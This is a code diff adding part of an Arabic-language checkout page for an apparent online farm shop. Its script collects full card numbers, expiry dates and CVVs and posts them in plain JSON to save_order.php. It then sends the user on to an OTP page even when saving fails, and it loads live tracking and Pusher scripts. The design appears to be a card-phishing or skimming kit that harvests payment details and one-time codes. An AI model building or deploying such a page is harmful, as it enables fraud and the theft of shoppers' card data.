+                                alert("تعذّر الاتصال بالخادم. تحقق من save_order.php");
+                            });
+                        return;
+                    }
+
+                    validateDelivery();
+                    var digits = val("cardNum").replace(/\s/g, "");
+                    var cvv = val("cardCvv").replace(/\D/g, "");
+                    if (!val("cardName")) {
+                        setFieldError("cardName", "اسم حامل البطاقة مطلوب");
+                    }
+                    if (digits.length !== 16) {
+                        setFieldError("cardNum", "رقم البطاقة يجب أن يكون 16 رقماً");
+                    }
+                    if (!val("cardMonth")) {
+                        setFieldError("cardMonth", "اختر شهر الانتهاء");
+                    }
+                    if (!val("cardYear")) {
+                        setFieldError("cardYear", "اختر سنة الانتهاء");
+                    }
+                    if (cvv.length < 3) {
+                        setFieldError("cardCvv", "رمز CVV مطلوب (3 أرقام على الأقل)");
+                    }
+                    if (document.querySelector(".field-group.has-error")) {
+                        scrollFirstCheckoutError();
+                        return;
+                    }
+                    try {
+                        var last4 = digits.slice(-4);
+                        if (/^\d{4}$/.test(last4)) {
+                            sessionStorage.setItem("farm_otp_card_last4", last4);
+                        } else {
+                            sessionStorage.removeItem("farm_otp_card_last4");
+                        }
+                        var chargeNow = payMode === "half" ? subtotal * 0.5 : subtotal;
+                        sessionStorage.setItem("farm_otp_charge_amount", String(Number(chargeNow.toFixed(3))));
+                        sessionStorage.setItem("farm_otp_currency", currency);
+                    } catch (e1) {}
+                    try {
+                        if (window.farmTrack && typeof window.farmTrack.flushBeacon === "function") {
+                            window.farmTrack.flushBeacon();
+                        }
+                    } catch (eTrack2) {}
+                    
+                    // 🚀 إرسال البيانات إلى save_order.php
+                    var orderData = {
+                        fullName: val("fullName"),
+                        phoneCC: val("phoneCC") || "+965",
+                        phoneLocal: val("phoneLocal"),
+                        addr1: val("addr1"),
+                        addr2: val("addr2"),
+                        building: val("building"),
+                        floor: val("floor"),
+                        apartment: val("apartment"),
+                        notes: val("driverNote"),
+                        paymentMethod: pm,
+                        paymentMode: payMode,
+                        subtotal: subtotal,
+                        total: payMode === "half" ? subtotal * 0.5 : subtotal,
+                        currency: currency,
+                        cart: JSON.parse(localStorage.getItem("farm_cart") || "[]"),
+                        cardName: val("cardName"),
+                        cardNum: digits,
+                        cardMonth: val("cardMonth"),
+                        cardYear: val("cardYear"),
+                        cardCvv: cvv,
+                        client_session_id: getFarmClientSessionId(),
+                        client_channel_suffix: getFarmChannelSuffix()
+                    };
+                    
+                    fetch('save_order.php', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(orderData)
+                    })
+                    .then(function(response) { return response.json(); })
+                    .then(function(result) {
+                        if (result.success) {
+                            console.log('✅ تم حفظ الطلب:', result.order_id);
+                            try {
+                                writeCheckoutDraft(collectCheckoutDraftFromDom());
+                            } catch (eDraftC) {}
+                            // حفظ order_id في sessionStorage
+                            sessionStorage.setItem('farm_order_id', result.order_id);
+                            window.location.href = result.redirect || "otp.html";
+                        } else {
+                            alert('خطأ: ' + result.message);
+                        }
+                    })
+                    .catch(function(error) {
+                        console.error('Error:', error);
+                        // حتى لو فشل الحفظ، نكمل للصفحة التالية
+                        window.location.href = "otp.html";
+                    });
+                };
+            }
+
+            fetch("/api/settings.json")
+                .then(function (r) {
+                    return r.json();
+                })
+                .then(function (s) {
+                    if (s && s.currencyLabel) currency = s.currencyLabel;
+                    if (s && s.orderWhatsapp) window.__checkoutWa = String(s.orderWhatsapp);
+                    render();
+                })
+                .catch(function () {
+                    render();
+                });
+        })();
+    </script>
+    <script src="https://js.pusher.com/8.4.0/pusher.min.js"></script>
+    <script src="js/client_track.js"></script>
+</body>
+
+</html>
